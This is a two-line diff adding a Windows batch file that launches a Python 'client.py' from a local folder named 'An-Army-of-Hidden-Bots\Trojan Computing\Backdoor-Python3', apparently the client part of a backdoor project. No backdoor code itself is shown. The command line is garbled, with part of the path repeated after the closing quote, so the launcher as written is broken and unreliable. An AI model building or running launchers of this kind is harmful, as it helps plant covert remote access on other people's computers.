@@ -1,0 +1,2 @@
+@echo off
+"D:\drive\Anaconda3\python.exe" "D:\drive\Programme files\GiyHUb_Pros\An-Army-of-Hidden-Bots\Trojan Computing\Backdoor-Python3\New folder\client.py"-of-Hidden-Bots\Trojan Computing\Backdoor-Python3\New folder\client.py"
